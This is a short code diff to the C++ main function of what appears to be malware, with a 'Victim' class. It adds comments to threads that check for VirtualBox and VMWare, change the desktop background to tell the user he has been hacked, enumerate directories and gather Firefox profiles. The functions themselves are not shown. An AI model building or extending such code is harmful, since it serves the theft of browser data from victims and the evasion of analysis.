@@ -22,10 +22,12 @@ int main(int argc, char* argv[]) {
 	std::thread tBackgroundChange(SCH::LockBackground);
 	std::thread t_DirectoriesEnum(&Victim::GetDirectoryList, CurrentComputer);
 	std::thread t_GetFirefoxProfiles(&Victim::GetFirefoxProfiles, CurrentComputer);
-	virtualBoxChange.join();
-	VMWareBoxChange.join();
-	tBackgroundChange.join();
-	t_DirectoriesEnum.join();
+	virtualBoxChange.join(); //VMEscape check on virtualBox
+	VMWareBoxChange.join(); //VMEscape check on VMWare
+	tBackgroundChange.join(); //Change Background to let the user knows he has been hacked... (This one eventually will become optional)
+	t_DirectoriesEnum.join(); //Directories enumeration
+	
+	//After all the beginning we can start enumerating FirefoxProfiles
 	CurrentComputer->GetFirefoxProfiles();
 	t_GetFirefoxProfiles.join();
 }
